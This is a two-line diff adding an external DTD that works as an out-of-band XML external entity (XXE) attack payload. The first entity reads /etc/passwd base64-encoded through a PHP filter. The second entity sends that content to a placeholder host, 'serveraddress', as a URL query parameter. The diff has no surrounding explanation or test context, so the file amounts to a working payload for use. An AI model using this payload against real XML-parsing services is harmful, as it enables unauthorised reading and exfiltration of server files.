@@ -1,0 +1,2 @@
+<!ENTITY % dat SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % newEnt "<!ENTITY &#x25; send SYSTEM 'http://serveraddress/?data=%dat;'>">
